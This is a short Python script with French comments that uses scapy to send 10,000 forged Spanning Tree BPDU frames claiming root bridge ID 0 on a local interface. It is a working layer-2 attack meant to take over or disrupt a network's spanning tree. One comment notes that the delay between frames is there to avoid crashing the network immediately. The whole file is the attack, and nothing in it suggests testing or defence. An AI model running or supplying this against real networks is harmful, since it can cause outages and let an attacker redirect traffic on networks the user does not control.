from scapy.all import *
import time
import netifaces

def get_mac_address(interface):
    try:
        return netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
    except KeyError:
        print(f"Impossible de récupérer l'adresse MAC de {interface}")
        return None

def send_bpdu_flood(interface, count=10000, delay=0.01):
    mac_src = get_mac_address(interface)
    if not mac_src:
        return

    bpdu_packet = Ether(dst="01:80:C2:00:00:00", src=mac_src) / \
                  LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
                  STP(rootid=0, bridgeid=0)

    print(f"Envoi de {count} trames BPDU sur {interface} avec MAC {mac_src}...")

    for _ in range(count):
        sendp(bpdu_packet, iface=interface, verbose=False)
        time.sleep(delay)  # Pause pour éviter un crash réseau immédiat

    print("Envoi terminé.")

if __name__ == "__main__":
    interface = "en0"  # Remplace par ton interface réseau
    send_bpdu_flood(interface)